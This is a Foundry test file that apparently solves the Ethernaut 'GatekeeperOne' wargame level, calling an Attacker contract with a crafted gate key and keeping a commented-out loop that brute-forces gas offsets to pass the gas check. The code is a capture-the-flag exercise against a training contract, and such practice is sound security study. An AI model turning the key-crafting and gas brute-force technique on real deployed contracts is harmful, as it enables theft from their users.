// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperOne.sol";
import "forge-std/console.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public keeper; 
    Attacker public attacker;
    
    function setUp() public {
        keeper = new GatekeeperOne();
        attacker = new Attacker();
    }

    function testAttack() public {
        // for (uint256 i = 0; i <= 8191; i++) {
        //     try victim.enter{gas: 800000 + i}(gateKey) {
        //         console.log("passed with gas ->", 800000 + i);
        //         break;
        //     } catch {}
        // }
        attacker.attack(0x1000000000001f38, address(keeper));
    }

}